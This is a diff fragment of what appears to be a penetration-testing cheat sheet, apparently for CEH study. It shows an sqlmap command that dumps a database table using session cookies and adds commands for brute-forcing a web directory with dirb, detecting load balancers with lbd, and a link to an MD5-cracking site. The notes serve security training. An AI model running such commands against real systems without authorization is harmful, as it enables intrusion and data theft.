@@ -132,4 +132,15 @@ Step 4: Extract User Data (Ethical Considerations Apply)
 
             sqlmap -u "http://site.blah.com/viewprofile.aspx?id=1" --cookie="cookiename=cookievalue;secondcookiename=cookievalue" -D databasename -T tablename --dump
       Only do this if you have explicit permission!
-        
+
+If directory listing is disabled, brute-force the /images/ directory:
+
+      Using dirb
+      dirb http://movies.cehorg.com/images/ -X .png
+
+For checking loadbalancers 
+      lbd blah.com
+
+For cracking MD5 hashes
+      https://hashes.com/en/decrypt/hash
+
